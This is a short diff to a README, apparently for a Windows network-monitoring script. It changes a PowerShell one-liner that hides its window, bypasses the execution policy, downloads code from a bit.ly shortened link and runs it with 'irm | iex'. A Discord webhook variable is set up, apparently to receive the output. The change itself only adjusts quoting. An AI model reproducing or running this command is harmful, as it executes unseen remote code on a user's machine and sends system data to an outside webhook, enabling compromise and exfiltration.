@@ -42,7 +42,7 @@ Functions available:
     - *In this option you must put the protocol that you want to monitor, for example $proto="TCP" if you want to monitor TCP, else leave blank, so $proto="".*
 
 ```powershell
-powershell -w h -ep bypass $discord='';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p="TCP";irm bit.ly/Windows-netstat | iex;
+powershell  -w h -ep bypass $discord='';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/Windows-netstat | iex
 ```
 
 You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
